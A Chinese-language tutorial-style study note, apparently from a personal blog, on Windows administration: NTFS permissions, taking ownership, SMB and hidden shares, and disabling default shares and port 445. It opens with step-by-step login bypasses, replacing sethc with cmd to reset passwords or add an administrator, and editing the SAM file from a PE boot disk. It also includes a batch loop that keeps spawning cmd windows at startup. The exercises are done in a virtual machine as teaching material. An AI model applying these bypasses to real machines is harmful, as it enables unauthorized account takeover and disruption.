+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">案例：破解win7系统密码</span><br><span class="line">实验步骤</span><br><span class="line">1、开启win7虚拟机的时候出现windows启动界面时强制关机；</span><br><span class="line">2、再开机，出现&quot;启动修复(推荐)&quot;及选择该项；	# 如未出现，则多尝试几次，还是不行的话就换其它方法</span><br><span class="line">3、出现系统还原提示，点击取消，等待几分钟，出现问题原因，点击查看详细信息；</span><br><span class="line">4、打开最后一个链接，即一个记事本；</span><br><span class="line">5、然后在记事本左上方点击打开文件，选择显示所有文件；</span><br><span class="line">6、找到sethc并改名其他名字，再找到cmd，改名为sethc；</span><br><span class="line">7、全部关闭，点击完成；</span><br><span class="line">8、然后重新开机后，连续按5次shift，将会弹出cmd工具，使用命令net user 用户名 新密码，就可以将当前用户的密码修改；</span><br><span class="line">9、或者另外建立一个用户，并提升为管理员，注销后，可再删除新建的用户，这样的好处是不修改当前用户的密码即可登录系统；</span><br></pre></td></tr></table></figure>
+
+<hr>
+<p>出现主界面时，点击”关闭客户机”</p>
+<p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202206020337677.png" alt="image-20220602033741413"></p>
+<p>关闭之后重新开机，就会出现如下错误修复，选择”启动修复(推荐)”</p>
+<p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202206020338471.png" alt="image-20220602033819337"></p>
+<p>然后在启动修复的主界面提示”你想使用系统还原还原计算机吗？”，点击取消</p>
+<p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202206020339421.png" alt="image-20220602033929220"></p>
+<p>过了几分钟左右，提示”启动修复无法自动修复此计算机”，点击”查看问题详细信息”</p>
+<p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202206020340536.png" alt="image-20220602034007425"></p>
+<p>下拉到最后，点击最后一个链接，就是一个记事本，打开之后点击左上角的”文件”，选择”打开”</p>
+<p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202206020341242.png" alt="image-20220602034137059"></p>
+<p>然后进入到C盘系统盘(注意这里可能会有混淆视听的操作，C盘不一定是真正的C盘，有可能是当前的D、E盘才是真正的C盘)</p>
+<p>C盘–&gt;windows–&gt;system32，然后在文件类型中选择”所有文件”</p>
+<p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202206020343339.png" alt="image-20220602034356124"></p>
+<p>然后选择一个文件或者文件夹，按s键查找s开头的文件，找到真正的”sethc”</p>
+<p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202206020344271.png" alt="image-20220602034443169"></p>
+<p>修改该sethc名字为任意一个名字，然后找到cmd，修改名字为”sethc”，这样下次调用”sethc”，系统就会误以为cmd是”sethc”从而打开cmd</p>
+<p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202206020346719.png" alt="image-20220602034608613"></p>
+<p>做完这个操作之后，关闭所有弹框，点击完成，然后系统自动关机。然后开机之后就会来到登录界面</p>
+<p>然后按5次shift</p>
+<p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202206020348662.png" alt="image-20220602034829475"></p>
+<p>可以看到打开了名字为”sethc”，实则是cmd的命令行终端，并且因为我们还没有登录任何用户，所以系统不知道我们是哪个用户，就把我们当成了system账户，也就是之前说的系统账户，比管理员账户的权限还要高。</p>
+<p>这里就可以创建用户、修改用户密码等操作了</p>
+<hr>
+<p>这里尝试一下创建一个新用户，然后加入管理员组</p>
+<p>按很多次shift键，启动了cmd之后</p>
+<p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202206030249775.png" alt="image-20220603024905679"></p>
+<p>然后重启<code>shutdown -r -f -t 0</code></p>
+<p>因为没给testadmin创建密码，所以点击头像就可以直接登录到系统了</p>
+<p>进入到系统之后可以随意查看任意文件，包括其他管理员的文件</p>
+<p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202206030250514.png" alt="image-20220603025051423"></p>
+<h1 id="和goto"><a href="#和goto" class="headerlink" title=":和goto"></a>:和goto</h1><p><code>:</code>是用来定义区块的，<code>goto</code>是用来跳转的，其实就是相当于定义函数吧。因为本来bat是自上而下运行的，加入了<code>:</code>就可以像函数一样使用</p>
+<p><code>: + goto + 判断</code>是经常使用的一种方法</p>
+<p>案例1：小程序</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">@echo off</span><br><span class="line">title xiaochengxu</span><br><span class="line">:menu</span><br><span class="line">cls</span><br><span class="line">echo =============</span><br><span class="line">echo 输入1：关机</span><br><span class="line">echo 输入2：创建账户</span><br><span class="line">echo 输入3：退出</span><br><span class="line">echo =============</span><br><span class="line"></span><br><span class="line">set /p value=请输入：</span><br><span class="line">if %value%=1 goto a</span><br><span class="line">if %value%=2 goto b</span><br><span class="line">if %value%=3 goto c</span><br><span class="line">echo 别乱输入！请重新输入1~3！</span><br><span class="line">pause</span><br><span class="line">goto menu</span><br><span class="line"></span><br><span class="line">:a</span><br><span class="line">set /p time=请输入关机倒计时多少秒：</span><br><span class="line">shutdown -s -f -t %time%</span><br><span class="line">goto menu</span><br><span class="line"></span><br><span class="line">:b</span><br><span class="line">set /p u=请输入用户名：</span><br><span class="line">set /p p=请输入密码：</span><br><span class="line">net user %u% %p% /add</span><br><span class="line">pause</span><br><span class="line">goto menu</span><br><span class="line"></span><br><span class="line">:c</span><br><span class="line">exit</span><br></pre></td></tr></table></figure>
+
+<p>案例2：死循环打开cmd</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">:a</span><br><span class="line">start cmd</span><br><span class="line">goto a</span><br></pre></td></tr></table></figure>
+
+<p>加强版就是加入启动菜单，每次开启都会死循环打开cmd</p>
+<h1 id="PE系统破解windows登录密码"><a href="#PE系统破解windows登录密码" class="headerlink" title="PE系统破解windows登录密码"></a>PE系统破解windows登录密码</h1><p><a target="_blank" rel="noopener" href="https://www.bilibili.com/video/BV1eE411K7Rw">U盘PE系统在虚拟机运行教程</a></p>
+<p>PE系统：微型维修系统(相当于缩小版、简化版windows操作系统)</p>
+<p>第一步：准备一个空U盘(记得备份U盘中的数据)</p>
+<p>第二步：准备一个PE系统制作工具(建议最新PE，因为新PE和旧PE可以破解的系统版本不一样，win 10 pe向下兼容，也是最新，所以建议win 10 pe)，插入U盘，并运行PE软件，点击一键安装，此时U盘就变成了PE启动盘</p>
+<p>第三步：将U盘插入到要破解的电脑中，开机，并立即狂按F2或者F1或者esc，进入bios，去修改启动顺序，让电脑开机之后先打开U盘中的PE系统</p>
+<p>第四步：开机，进入PE系统，此时也可以看到一个windows桌面，桌面上一般有一个篡改SAM文件的工具，运行该工具，并打开SAM文件，直接修改密码</p>
+<p>第五步：拔掉U盘，重启电脑</p>
+<hr>
+<h2 id="光盘"><a href="#光盘" class="headerlink" title="光盘"></a>光盘</h2><p>例子：</p>
+<p>在虚拟机的windows xp中假装把shimisi用户的密码修改成自己都不记得的字符串</p>
+<p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202206040144739.png" alt="image-20220604014439560"></p>
+<p>然后关机，在windows xp的虚拟机设置中设置CD/DVD，相当于虚拟机使用光盘或者是U盘</p>
+<p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202206040147748.png" alt="image-20220604014724642"></p>
+<p>设置好之后，VM有个功能就是可以不用按F2或者F1或者esc进入bios</p>
+<p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202206040148289.png" alt="image-20220604014843201"></p>
+<p>点击之后就可疑进入到bios了，选中CD光盘，然后如果有小键盘直接按<code>+</code>号，如果是退格键左边的+号，需要<code>shift和+</code>号</p>
+<p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202206040151755.png" alt="image-20220604015127657"></p>
+<p>设置好之后，按右键，就可以到Exit</p>
+<p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202206040153218.png" alt="image-20220604015315094"></p>
+<p>设置完之后就会重启，来到PE界面，选中第二个选项</p>
+<p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202206040154144.png" alt="image-20220604015401829"></p>
+<p>然后就会进入到PE系统的主界面，可以看到篡改SAM的软件</p>
+<p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202206040155489.png" alt="image-20220604015522205"></p>
+<p>双击软件快捷方式，然后就会打开这个软件，这个软件会自动检测到SAM文件的路径，点击”打开”按钮，就会查询到所有用户账号</p>
+<p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202206040156658.png" alt="image-20220604015649494"></p>
+<p>然后点击shimisi–&gt;更改口令，然后设置新密码，点击ok，然后再点击保存更改，就可以成功修改密码了</p>
+<p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202206040158263.png" alt="image-20220604015813179"></p>
+<p>然后把U盘拔掉，就是点击虚拟机设置，然后<strong>把设备状态的两个√去掉</strong>就可以了，下次再用的时候记得再打√</p>
+<p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202206040159204.png" alt="image-20220604015942098"></p>
+<p>重启之后因为把U盘拔掉了，所以电脑自动运行硬盘中的windows xp系统</p>
+<h2 id="U盘"><a href="#U盘" class="headerlink" title="U盘"></a>U盘</h2><p>如果是U盘的话，添加一个硬盘</p>
+<p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202206051845691.png" alt="image-20220605184549543"></p>
+<p>然后选择物理磁盘</p>
+<p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202206051846775.png" alt="image-20220605184605684"></p>
+<p>然后选择U盘添加</p>
+<p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202206051846649.png" alt="image-20220605184640554"></p>
+<p>添加之后进入电脑固件，把U盘的优先级提高到比硬盘还高</p>
+<p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202206051848815.png" alt="image-20220605184801672"></p>
+<p>然后F10保存重启就可以进入到PE系统了</p>
+<h1 id="NTFS权限概述"><a href="#NTFS权限概述" class="headerlink" title="NTFS权限概述"></a>NTFS权限概述</h1><p>1、通过设置NTFS权限，实现不同的用户访问不同的权限</p>
+<p>2、分配了正确的访问权限后，用户才能访问其资源</p>
+<p>3、设置权限防止资源被篡改、删除</p>
+<p>常用的文件系统有：</p>
+<ul>
+<li>FAT windows</li>
+<li>NTFS windows</li>
+<li>EXT linux常见</li>
+</ul>
+<p>为什么说<code>NTFS权限</code>，而不是直接说<code>权限</code>呢？我们右键磁盘(文件夹、文件也可以)</p>
+<p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202206060053230.png" alt="image-20220606005326035"></p>
+<p>发现当前磁盘是NTFS，然后右上角有个<code>安全</code>的选项，点击可以看到该磁盘的组权限有哪些是被允许，有哪些是不被允许的</p>
+<p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202206060054979.png" alt="image-20220606005438859"></p>
+<p>而如果磁盘是FAT格式，这是比较老的格式了，不支持对文件或者磁盘的权限进行如此详细的划分，所以一般说权限的话就会说NTFS权限</p>
+<h2 id="NTFS特点"><a href="#NTFS特点" class="headerlink" title="NTFS特点"></a>NTFS特点</h2><ol>
+<li>提高磁盘读写性能</li>
+<li>可靠性、加密文件系统、访问控制列表(设置权限)</li>
+<li>磁盘利用率、压缩、磁盘配额</li>
+<li>支持单个文件大于4个G</li>
+</ol>
+<h2 id="修改NTFS权限"><a href="#修改NTFS权限" class="headerlink" title="修改NTFS权限"></a>修改NTFS权限</h2><p>假设我们有三个用户，然后分别对名叫”jason”的文件夹进行不同的权限分配</p>
+<ul>
+<li>a用户：只可对”jason”文件夹进行读</li>
+<li>b用户：只可对”jason”文件夹进行写</li>
+<li>c用户：可对”jason”文件夹进行读写和修改</li>
+</ul>
+<p>我们在E盘目录下创建”jason”文件夹，然后右键属性–&gt;安全，可以查看权限内容，点击编辑就会显示如下</p>
+<p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202206060114348.png" alt="image-20220606011430230"></p>
+<p>可以看到本来就会给文件夹分配以上的组或者用户，而且无法删除任何一个组或者用户的权限，为什么呢？</p>
+<p>因为E盘相当于”jason”文件夹的父节点，而”jason”是E盘的子节点，它们具有继承关系，E盘的权限组会被”jason”文件夹继承，而我们只想让该文件夹除了管理员以外，进行简单的读写权限分配</p>
+<p>我们可以先把”jason”文件夹和E盘解除关系，否则删除不了其它用户和组</p>
+<p>在安全的选项下点击”高级”</p>
+<p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202206060118025.png" alt="image-20220606011834900"></p>
+<p>然后点击更改权限</p>
+<p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202206060119391.png" alt="image-20220606011912302"></p>
+<p>点击然后把框里面的√去掉</p>
+<p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202206060119214.png" alt="image-20220606011942977"></p>
+<p>就会出现如下提示</p>
+<ul>
+<li>添加：和父节点解除关系，还会继承父权限，但是可以删除和添加</li>
+<li>删除：和父节点解除关系，不会继承父权限，但是可以删除和添加</li>
+<li>取消：不想解除关系了</li>
+</ul>
+<p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202206060120894.png" alt="image-20220606012003813"></p>
+<p>这里点击添加或者删除都可以，假如点击了”添加”，回到”jason”文件夹的属性，发现可以对用户和组进行添加和删除了(删到只剩管理员组和75717这个管理员)</p>
+<p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202206060124378.png" alt="image-20220606012449257"></p>
+<p>然后我们添加三个用户：a、b、c (中间加冒号，表示连续查找)</p>
+<p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202206060133683.png" alt="image-20220606013327571"></p>
+<p>然后第一个查找a，发现有多个a开头的用户或者组</p>
+<p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202206060134230.png" alt="image-20220606013405151"></p>
+<p>照选就可以了，添加完以后点击确定，然后可以在权限组和用户那栏看到已经添加成功，并且可以在下面设置权限</p>
+<p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202206060135908.png" alt="image-20220606013519805"></p>
+<p>“列出文件夹内容”权限是必须要的，因为这个权限保证该用户或者组可以进入该文件夹里，其它的话就跟字面上的意思差不多了</p>
+<ul>
+<li>完全控制：所有权限都具有</li>
+<li>修改：增删查改执行，但是没有特殊权限</li>
+<li>读取和执行：可读可执行</li>
+<li>列出文件夹内容：进入文件夹权限</li>
+<li>读取：可读</li>
+<li>写入：可以对文件夹进行写入操作</li>
+</ul>
+<p>在jason验证一下a用户是可读，b用户是可写，c用户是可读可写</p>
+<p>a用户：读取”jason”文件夹下的haha.txt</p>
+<p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202206060148105.png" alt="image-20220606014811016"></p>
+<p>成功读取，当然了<strong>如果有读取权限，也意味着有下载的权限，就是可以拖动里面的内容到自己的桌面或者属于自己的文件夹内</strong></p>
+<p>如果要添加文件，则会提示输入管理员密码</p>
+<p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202206060149864.png" alt="image-20220606014915776"></p>
+<p>如果修改文件内容，也会提示错误</p>
+<p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202206060149898.png" alt="image-20220606014945795"></p>
+<hr>
+<p>b用户：尝试打开文本内容，提示报错</p>
+<p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202206060150886.png" alt="image-20220606015055801"></p>
+<p>如果在里面新建文档也是可以的，但是不可以重命名(<strong>因为这是属于修改的权限，不是写入的权限，不能在该文件夹里修改内容</strong>)</p>
+<p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202206060155091.png" alt="image-20220606015531956"></p>
+<p>而如果在自己的桌面拖动文件到该文件夹里，也是可以的，因为有写入权限</p>
+<p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202206060157487.png" alt="image-20220606015718346"></p>
+<p>当然了，因为没有读取权限，所以刚拖进去的文件也是没有权限读取(打开)的</p>
+<p><strong>ps：这里解释一下，刚拖进去的文件因为已经和该文件夹产生了关系，文件已经变成了该文件夹的子节点了，所以b用户对文件夹没有读取权限，而该文件继承了文件夹的权限，所以b用户对该文件也没有读取权限了</strong></p>
+<p>c用户验证了一下没有毛病，可以删可以读可以写，就不写那么多了</p>
+<h2 id="权限累加"><a href="#权限累加" class="headerlink" title="权限累加"></a>权限累加</h2><p>当用户存在于不同的组时，用户的权限是可以累加的</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">如果a用户属于HR组和IT组，HR组可以对jason文件夹进行写入操作，IT组可以对jason文件夹进行读取操作，则a用户最终的权限为读取和写入</span><br></pre></td></tr></table></figure>
+
+<h2 id="取得所有权"><a href="#取得所有权" class="headerlink" title="取得所有权"></a>取得所有权</h2><p>默认只有administrator有这个权限!</p>
+<p>作用:可以将任何文件夹的所有者改为administrator</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">案例：</span><br><span class="line">用户a已经离职，但xxx文件夹的属主是a，而a用户对xxx文件夹进行过权限修改，除了他自己，任何人甚至管理员都打开不了该文件夹，而管理员administrator用户可以将xxx文件夹重新修改权限</span><br></pre></td></tr></table></figure>
+
+<p>假如a用户在E盘下创建一个文件夹为<code>comeon</code>，所以他是该文件夹的所有者，然后他解除了跟E盘的关系之后把权限组其他成员包括管理员全部删除了</p>
+<p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202206060215593.png" alt="image-20220606021501388"></p>
+<p>然后管理员就没有权限访问该文件夹了</p>
+<p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202206060215170.png" alt="image-20220606021534043"></p>
+<p>想要获取永久访问权限点击”继续”也被拒绝允许</p>
+<p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202206060215999.png" alt="image-20220606021542817"></p>
+<p>点击”安全选项卡”，利用管理员的”特殊权限”强制修改所有者为管理员，并且把子文件夹和子文件全部修改所有者权限</p>
+<p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202206060218217.png" alt="image-20220606021842062"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202206060219685.png" alt="image-20220606021915598"></p>
+<p>点击”是”，该文件夹及子文件全部的权限都强制修改成管理员了，文件夹下的文件也都可以打开</p>
+<p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202206060219241.png" alt="image-20220606021929142"></p>
+<p>查看一下文件夹属性，发现所有者已经变成了管理员</p>
+<p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202206060219025.png" alt="image-20220606021947891"></p>
+<h2 id="文件复制对权限的影响"><a href="#文件复制对权限的影响" class="headerlink" title="文件复制对权限的影响"></a>文件复制对权限的影响</h2><p>在win 2003/win xp操作系统中，文件复制后，文件的权限会被目标文件夹的权限覆盖，而如果是同分区剪切粘贴的操作，会保留原有的组或用户名权限</p>
+<p>由于NTFS的权限是以分区为单位进行保存的，只有移动到同一分区内才保留原来设置的权限，否则为继承目的地文件夹或者驱动器的NTFS权限(原设定的权限被清除)。</p>
+<p><a target="_blank" rel="noopener" href="https://www.jy135.com/diannao/332001.html">详细看这里</a></p>
+<p><a target="_blank" rel="noopener" href="https://www.bilibili.com/video/BV1Tb4y1h7uw?p=26">b站讲解</a></p>
+<p>同分区复制  — 覆盖</p>
+<p>同分区移动  — 不变</p>
+<p>不同分区移动  — 覆盖</p>
+<p>不同分区复制  — 覆盖</p>
+<hr>
+<h1 id="文件共享服务-SMB"><a href="#文件共享服务-SMB" class="headerlink" title="文件共享服务(SMB)"></a>文件共享服务(SMB)</h1><h2 id="1-共享服务器概述"><a href="#1-共享服务器概述" class="headerlink" title="1.共享服务器概述"></a>1.共享服务器概述</h2><p>通过网络提供文件共享服务，提供文件下载和上传服务(类似于FTP服务器)，<strong>端口号：445</strong></p>
+<h2 id="2-创建共享"><a href="#2-创建共享" class="headerlink" title="2.创建共享"></a>2.创建共享</h2><p>win 7方法：文件夹右键属性–共享–高级共享–共享此文件夹<br>然后可以设置共享名</p>
+<p><strong>共享权限这里建议不要修改，因为共享权限与安全里的用户或组权限取的是交集，如果a用户共享里的权限比安全里的权限少则取共享的权限为主，一般为了方便都是在共享权限中设置everyone的组时完全控制权限的，这样的话权限就只由安全里的用户或组权限来决定</strong></p>
+<p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202206061822187.png" alt="image-20220606182156948"></p>
+<p>点击应用然后确定，可以看到网络路径，这个路径是局域网其它主机用来访问该共享文件夹的路径，<strong>这个路径是计算机名+共享文件夹</strong></p>
+<p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202206061823180.png" alt="image-20220606182316076"></p>
+<p>再点击共享，设置一下a的权限(因为前面说到共享权限和安全权限是交集，如想要读取，则共享权限和安全权限的读取权限都要被允许)</p>
+<p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202206061831578.png" alt="image-20220606183134451"></p>
+<p>但是一般直接设置everyone的组获得全部权限(如下)就可以了</p>
+<p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202206061835692.png" alt="image-20220606183546588"></p>
+<p>然后打开物理机的运行框，输入刚才的路径(使用ip地址也可以，<code>\\192.168.29.140\thejason</code>)</p>
+<p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202206061824076.png" alt="image-20220606182440961"></p>
+<p>输入用户和密码(注意！如果这里没有出现弹框，说明自己的密码和服务器管理员的密码相同！)</p>
+<p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202206061828246.png" alt="image-20220606182825153"></p>
+<p>就可以访问刚才被共享的文件夹了！</p>
+<p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202206061827620.png" alt="image-20220606182700491"></p>
+<p>也可以用该路径配合cmd命令行进行操作。<strong>有上传权限可以把本地文件copy到共享文件夹中，如果有读取权限可以从共享文件夹中下载文件</strong></p>
+<p>下载共享文件夹中的文件</p>
+<p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202206061841721.png" alt="image-20220606184112603"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202206061841706.png" alt="image-20220606184139613"></p>
+<p>如果是上传文件，远程路径和本地路径反过来写就行了</p>
+<p>如果想要用其它用户去访问该共享文件夹的话，需要注销该物理机，否则会记住刚才登陆过的账号和密码，就不会显示登陆界面了</p>
+<h2 id="3-创建隐藏共享文件夹"><a href="#3-创建隐藏共享文件夹" class="headerlink" title="3.创建隐藏共享文件夹"></a>3.创建隐藏共享文件夹</h2><p>虽然想要共享文件夹，但是还想要一般人看不到该文件夹，则需要进行隐藏</p>
+<p>右键–&gt;属性，在设置共享名的时候，在后面加入<code>$</code>符，即如果共享名为<code>jason</code>，则设置成<code>jason$</code>，该共享文件夹就可以隐藏起来了</p>
+<p>这个隐藏文件夹在图形界面肯定看不到的，而如果想要访问该隐藏的共享文件夹，需要在路径上加入<code>jason$</code>，即<code>\\ip地址\jason$</code></p>
+<hr>
+<p>创建文件夹，共享名为<code>jason$</code></p>
+<p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202206062052030.png" alt="image-20220606205218891"></p>
+<p>里面放入文件jm.txt，点击应用并确定后，在物理机查看该虚拟机共享的文件夹</p>
+<p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202206062053472.png" alt="image-20220606205326377"></p>
+<p>没有看到隐藏的共享文件夹，在路径中加入<code>jason$</code></p>
+<p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202206062054483.png" alt="image-20220606205405380"></p>
+<h2 id="4-net-share"><a href="#4-net-share" class="headerlink" title="4.net share"></a>4.net share</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">C:\Windows\system32&gt;net share	#查看主机已经共享的文件或文件夹</span><br><span class="line"></span><br><span class="line">共享名       资源                            注解</span><br><span class="line"></span><br><span class="line">----------------------------------------------------------</span><br><span class="line"><span class="meta">C$</span><span class="bash">           C:\                             默认共享</span></span><br><span class="line"><span class="meta">E$</span><span class="bash">           E:\                             默认共享</span></span><br><span class="line"><span class="meta">IPC$</span><span class="bash">                                         远程 IPC</span></span><br><span class="line"><span class="meta">jason$</span><span class="bash">       E:\机密</span></span><br><span class="line"><span class="meta">ADMIN$</span><span class="bash">       C:\Windows                      远程管理</span></span><br><span class="line">thejason     E:\jason</span><br><span class="line">命令成功完成。</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>可以看到C盘和E盘的根目录\C盘下的windows文件夹都已经被共享了，如果知道该主机的管理员账号和密码以及ip地址，就可以轻松访问磁盘</p>
+<p>如果要删除共享的磁盘，则</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">net share 共享名 /del</span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">#</span><span class="bash">比如删除E盘的共享</span></span><br><span class="line">C:\Windows\system32&gt;net share e$ /del</span><br><span class="line"><span class="meta">e$</span><span class="bash"> 已经删除。</span></span><br><span class="line"></span><br><span class="line">C:\Windows\system32&gt;net share</span><br><span class="line"></span><br><span class="line">共享名       资源                            注解</span><br><span class="line"></span><br><span class="line">--------------------------------------------------------</span><br><span class="line"><span class="meta">C$</span><span class="bash">           C:\                             默认共享</span></span><br><span class="line"><span class="meta">IPC$</span><span class="bash">                                         远程 IPC</span></span><br><span class="line"><span class="meta">jason$</span><span class="bash">       E:\机密</span></span><br><span class="line"><span class="meta">ADMIN$</span><span class="bash">       C:\Windows                      远程管理</span></span><br><span class="line">thejason     E:\jason</span><br><span class="line">命令成功完成。</span><br></pre></td></tr></table></figure>
+
+<p>但是删除之后，重启就会恢复原来的样子，刚才的命令只是临时起作用，所以这就需要屏蔽系统共享的操作了</p>
+<h2 id="5-屏蔽系统共享"><a href="#5-屏蔽系统共享" class="headerlink" title="5.屏蔽系统共享"></a>5.屏蔽系统共享</h2><ul>
+<li>打开注册表：regedit</li>
+<li>定位共享注册表位置<code>HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\LanmanServer\Parameters</code>右键新建REG_ DWORD类型的AutoShareServer键  ,值为0</li>
+</ul>
+<p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202206070530780.png" alt="image-20220607053018652"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202206070531242.png" alt="image-20220607053109104"></p>
+<p>0代表关闭，1代表开启，所以这里意思是以后开启就不要自动开启系统共享了</p>
+<p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202206070531402.png" alt="image-20220607053124144"></p>
+<h2 id="6-关闭445服务"><a href="#6-关闭445服务" class="headerlink" title="6.关闭445服务"></a>6.关闭445服务</h2><p>可以看到<code>IPC$</code>还是对外开放，这是空链接，如果别人知道管理员账号密码，然后连接到该<code>IPC$</code>，即使是空链接，还是可以远程操控电脑的所有操作，比如注册表、磁盘分区等。即使不共享文件夹了，445端口还是默认打开，<code>IPC$</code>还是可以连接</p>
+<h3 id="方法1"><a href="#方法1" class="headerlink" title="方法1"></a>方法1</h3><p>打开services.msc,并停止及禁用server服务，即关闭445端口</p>
+<p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202206071511305.png" alt="image-20220607151115160"></p>
+<p>可以看到启动类型为”自动”，说明开机自启，启动类型选择禁用、然后停止当前进程的话就相当于永久禁用445端口的服务了，下次开机也不会自启了</p>
+<h3 id="方法2"><a href="#方法2" class="headerlink" title="方法2"></a>方法2</h3><p>禁止被访问445、配置高级安全防火墙-入站规则（在win7及以上系统、win2008及以上系统）</p>
+<p>打开控制面板–&gt;系统和安全–&gt;Windows 防火墙</p>
+<p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202206071513375.png" alt="image-20220607151306270"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202206071641999.png" alt="image-20220607164141837"></p>
+<p>这里解释一下</p>
+<ul>
+<li>入站规则：就是别人访问该主机的时候制定的规则</li>
+<li>出站规则：就是该主机访问别人的时候制定的规则(一般不设置)</li>
+</ul>
+<p>鼠标右键入站规则–&gt;新建规则</p>
+<p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202206071643791.png" alt="image-20220607164348629"></p>
